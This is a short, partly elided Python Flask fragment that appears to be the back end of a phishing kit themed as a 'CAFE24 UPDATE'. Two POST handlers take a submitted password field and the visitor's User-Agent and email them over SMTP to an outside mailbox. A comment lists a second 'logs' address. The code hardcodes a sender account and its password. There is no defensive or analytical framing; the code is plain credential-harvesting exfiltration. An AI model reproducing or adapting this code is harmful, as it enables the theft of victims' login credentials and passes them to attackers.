...
def first():
    if request.method == 'POST':
        ...
        sender_email = "smik@bseng2i.com"
        receiver_email = "breckyn.kaylan@marsoak.com"
        password = "1RQoQkJC[l)l"
        useragent = request.headers.get('User-Agent')
        message = MIMEMultipart("alternative")
        message["Subject"] = "CAFE24 UPDATE ! 1"
        ...
        with smtplib.SMTP_SSL("mail.bseng2i.com", 465) as server:
...
def second():
    if request.method == 'POST':
        ...
        passwordemail = request.form.get("pig")
        sender_email = "smik@bseng2i.com"
        receiver_email = "breckyn.kaylan@marsoak.com" #logs4john@yandex.com
        password = "1RQoQkJC[l)l"
        useragent = request.headers.get('User-Agent')
        message = MIMEMultipart("alternative")
        message["Subject"] = "CAFE24 UPDATE !! 2"
        message["From"] = sender_email
        message["To"] = receiver_email
        text = """\
        Hi,
